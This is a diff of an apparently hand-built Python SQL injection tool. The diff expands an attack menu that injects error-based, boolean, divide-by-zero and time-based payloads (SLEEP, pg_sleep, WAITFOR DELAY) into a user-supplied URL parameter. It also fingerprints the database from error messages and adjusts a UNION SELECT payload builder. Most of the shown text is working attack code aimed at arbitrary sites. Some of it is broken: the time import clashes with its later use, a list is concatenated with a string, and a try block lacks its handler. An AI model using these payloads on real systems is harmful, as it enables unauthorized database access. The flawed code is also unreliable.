@@ -1,7 +1,7 @@
 import requests
 from bs4 import BeautifulSoup
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-
+from time import time
 
 # full_url = input("enter url:")
 # session = requests.Session()
@@ -155,30 +155,205 @@ def datatype_tester():
         pass
 
 def attack():
-    full_url = input("enter url:")
-    session = requests.Session()
-    parse = urlparse(full_url)
-    query_params = parse_qs(parse.query)
-
-    print("\n parameters found :")
-    for i, key in enumerate(query_params.keys()):
-        print(f"{i+1}, {key} = {query_params[key]}")
-
-    choice = int(input("\nselect param number:"))-1
-    edit_param = list(query_params.keys())[choice]
     while True:
-        self_payload = input("enter your payload:")
-        test_params = query_params.copy()
-        test_params[edit_param] = [self_payload]
-        self_query = urlencode(test_params,doseq=True)
-        self_url = urlunparse(parse._replace(query=self_query))
-        try:    
-            res = session.get(self_url)
-            print(res.text[:500])
-            print("\nstatus code :",res.status_code)
-            break
-        except Exception as e:
-            print("pls try again")
+        try:
+            command = int(input(""" \nEnter your choice for testing:
+                1 : URL (Query String)
+                2 : Cookie
+                3 : POST
+                4 : HTTP Header
+                5 : Hidden Form Inputs
+                6 : RESTful API or Path Parameter
+                7 : WebSocket messages
+                8 : AJAX requests / Background APIs
+                9 : URL Fragment / Hash
+                >>>
+"""))
+            match command:
+                case 1:
+                    url = input("enter url:")
+                    session = requests.Session()
+                    res_prime = session.get(url)
+                    parse = urlparse(url)
+                    query_params = parse_qs(parse.query)
+
+                    print("\n parameters found :")
+                    for i, key in enumerate(query_params.keys()):
+                        print(f"{i+1}, {key} = {query_params[key]}")
+
+                    choice = int(input("\nselect param number:"))-1
+                    edit_param = list(query_params.keys())[choice]
+                    payloads_int = ["'","''"," AND 1=1"," AND 1=2"," AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a","sleep"]
+                    payloads_str = []
+                    int_or_str = int(input("""\nWhat's the type of query value :
+                        [1] int
+                        [2] str
+                        >>>"""))
+                    if int_or_str == 1:
+                        for i, payload in enumerate(payloads_int,1):
+                            if i in range(1,6):
+                                # injected_val = url + payload
+                                test_params = query_params.copy()
+                                
+                                print(f"Testing ({payload})")
+                                p1targets = ["Internal Server Error","syntax error","unterminated string"]
+                                p1targets_mysql = ["You have an error in your SQL syntax"]
+                                p1targets_postgresql = ["syntax error at or near","unterminated quoted string"]
+                                p1targets_mssql = ["Unclosed quotation mark after the character string", "Incorrect syntax near"]
+                                p1targets_oracle = ["quoted string not properly terminated"]
+                                p1targets_sqlite = ["unrecognized token","unterminated quoted string"]
+                                p2target_mysql = ["Division by 0"]
+                                p2target_postgresql_or_sqlite = ["division by zero"]
+                                p2target_mssql = ["Divide by zero error encountered"]
+                                p2target_oracle = ["divisor is equal to zero"]
+                                try:
+                                    res_p_1 = None
+                                    if i == 1:
+                                        test_params[edit_param] = [test_params[edit_param] + payload]
+                                        new_query = urlencode(test_params, doseq=True)
+                                        new_url = urlunparse(parse._replace(query=new_query))
+                                        res = session.get(new_url)
+                                        print(f"\n########   Pyaload 1 : [{payload}]   ########")
+                                        print("\nPrime response len:", len(res_prime.text))
+                                        print("\nResponse len:", len(res.text))
+                                        print("\nPrime status code:", res_prime.status_code)
+                                        print("\nStatus code:", res.status_code)
+                                        res_p_1 = res
+                                        if any(target.lower() in res.text.lower() for target in p1targets):
+                                            print(f"Found SQL injection (unkown data_base): [{payload}]")
+                                        elif any(target.lower() in res.text.lower() for target in p1targets_mysql):
+                                            print(f"Found SQL injection (MySQL): [{payload}]")
+                                        elif any(target.lower() in res.text.lower() for target in p1targets_postgresql):
+                                            print(f"Found SQL injection (PostgreSQL): [{payload}]")
+                                        elif any(target.lower() in res.text.lower() for target in p1targets_mssql):
+                                            print(f"Found SQL injection (MSSQL): [{payload}]")
+                                        elif any(target.lower() in res.text.lower() for target in p1targets_oracle):
+                                            print(f"Found SQL injection (Oracle): [{payload}]")
+                                        elif any(target.lower() in res.text.lower() for target in p1targets_sqlite):
+                                            print(f"Found SQL injection (SQLite): [{payload}]")
+                                    if i == 2:
+                                        test_params[edit_param] = [test_params[edit_param] + payload]
+                                        new_query = urlencode(test_params, doseq=True)
+                                        new_url = urlunparse(parse._replace(query=new_query))
+                                        res = session.get(new_url)
+                                        print(f"\n########   Payload 1 : [{payload}]   ########")
+                                        print("\nPrime response len:", len(res_prime.text))
+                                        if res_p_1:
+                                            print(f"Previous payload response: {len(res_p_1.text)}")
+                                        else:
+                                            print("Previous response not set.")
+                                        print("\nResponse len:", len(res.text))
+                                        print("\nPrime status code:", res_prime.status_code)
+                                        print("\nStatus code:", res.status_code)
+                                    if i == 3:
+                                        test_params[edit_param] = [test_params[edit_param] + payload]
+                                        new_query = urlencode(test_params, doseq=True)
+                                        new_url = urlunparse(parse._replace(query=new_query))
+                                        res = session.get(new_url)
+                                        print(f"\n########   Pyaload 2 : [{payload}]   ########")
+                                        print("\nPrime response len:", len(res_prime.text))
+                                        print("\nResponse len:", len(res.text))
+                                        print("\nPrime status code:", res_prime.status_code)
+                                        print("\nStatus code:", res.status_code)
+                                    if i == 4:
+                                        test_params[edit_param] = [test_params[edit_param] + payload]
+                                        new_query = urlencode(test_params, doseq=True)
+                                        new_url = urlunparse(parse._replace(query=new_query))
+                                        res = session.get(new_url)
+                                        print(f"\n########   Pyaload 2 : [{payload}]   ########")
+                                        print("\nPrime response len:", len(res_prime.text))
+                                        print("\nresponse len:", len(res.text))
+                                        print("\nPrime status code:", res_prime.status_code)
+                                        print("\nStatus code:", res.status_code)
+                                        if any(target.lower() in res.text.lower() for target in p2target_mysql):
+                                            print(f"Found SQL injection (MySQL): [{payload}]")
+                                        if any(target.lower() in res.text.lower() for target in p2target_postgresql_or_sqlite):
+                                            print(f"Found SQL injection (PostgreSQL or SQLite): [{payload}]")
+                                        if any(target.lower() in res.text.lower() for target in p2target_mssql):
+                                            print(f"Found SQL injection (MSSQL): [{payload}]")
+                                        if any(target.lower() in res.text.lower() for target in p2target_oracle):
+                                            print(f"Found SQL injection (Oracle): [{payload}]")
+
+                                    if i == 5:
+                                        test_params[edit_param] = [test_params[edit_param] + payload]
+                                        new_query = urlencode(test_params, doseq=True)
+                                        new_url = urlunparse(parse._replace(query=new_query))
+                                        res = session.get(new_url)
+                                        print(f"\n########   Pyaload 3 : [{payload}]   ########")
+                                        print("\nPrime response len:", len(res_prime.text))
+                                        print("\nresponse len:", len(res.text))
+                                        print("\nPrime status code:", res_prime.status_code)
+                                        print("\nStatus code:", res.status_code)
+                                except Exception as e:
+                                    print(e)
+                                if i == 6:
+                                    print(f"\n########   Payload 6 : Time-Based SQLi Testing ########")
+
+                                    payloads = {
+                                        "MySQL": " AND SLEEP(5)",
+                                        "PostgreSQL": " AND pg_sleep(5)",
+                                        "MSSQL": "; WAITFOR DELAY '0:0:5'--",
+                                        "Oracle": " AND 1=DBMS_LOCK.SLEEP(5)"
+                                    }
+
+                                    original_value = query_params[edit_param][0]
+
+                                    for db_type, payload in payloads.items():
+                                        test_params = query_params.copy()
+                                        test_params[edit_param] = [original_value + payload]
+                                        new_query = urlencode(test_params, doseq=True)
+                                        new_url = urlunparse(parse._replace(query=new_query))
+
+                                        print(f"\n########   Testing {db_type} payload : [{payload}]   ########")
+                                        print(f"URL: {new_url}")
+
+                                        start = time.time()
+                                        res = session.get(new_url)
+                                        end = time.time()
+                                        diff = end - start
+
+                                        print(f"Response length: {len(res.text)}")
+                                        print(f"Status code: {res.status_code}")
+                                        print(f"Time taken: {diff:.2f} seconds")
+
+                                        if diff > 4:
+                                            print(f"✅ Likely vulnerable to time-based SQLi – Possible DB: {db_type}")
+                                        else:
+                                            print("❌ No significant delay – unlikely vulnerable for this payload.")
+
+
+
+                    elif int_or_str == 2:
+                        for payload in payloads_str:
+                            injected_val = url + payload
+
+            
+
+
+    # full_url = input("enter url:")
+    # session = requests.Session()
+    # parse = urlparse(full_url)
+    # query_params = parse_qs(parse.query)
+
+    # print("\n parameters found :")
+    # for i, key in enumerate(query_params.keys()):
+    #     print(f"{i+1}, {key} = {query_params[key]}")
+
+    # choice = int(input("\nselect param number:"))-1
+    # edit_param = list(query_params.keys())[choice]
+    # while True:
+    #     self_payload = input("enter your payload:")
+    #     test_params = query_params.copy()
+    #     test_params[edit_param] = [self_payload]
+    #     self_query = urlencode(test_params,doseq=True)
+    #     self_url = urlunparse(parse._replace(query=self_query))
+    #     try:    
+    #         res = session.get(self_url)
+    #         print(res.text[:500])
+    #         print("\nstatus code :",res.status_code)
+    #         break
+    #     except Exception as e:
+    #         print("pls try again")
 
 
 def version():
@@ -324,9 +499,9 @@ def db_info_interactive():
     # نهایی‌سازی payload
     payload_raw = f"SELECT {','.join(col)}{from_clause}{where_clause}"
     if quote_need:
-        payload = f"' UNION {payload_raw}--"
+        payload = f"' UNION {payload_raw}-- "
     else:
-        payload = f"UNION {payload_raw}--"
+        payload = f"UNION {payload_raw}-- "
 
     test_params = query_params.copy()
     test_params[edit_param] = [payload]
@@ -469,13 +644,13 @@ def blind_sql():
                     break
         except Exception as e:
             print("ERROR:", e)
-            print("enter valid number:")
+            print("Enter valid number:")
 
 
 
 while True:
     try:
-        command = int(input("""enter command:
+        command = int(input("""Enter command:
             1 : Attack
             2 : Find Version
             3 : Column Tester (with -- and # and ')
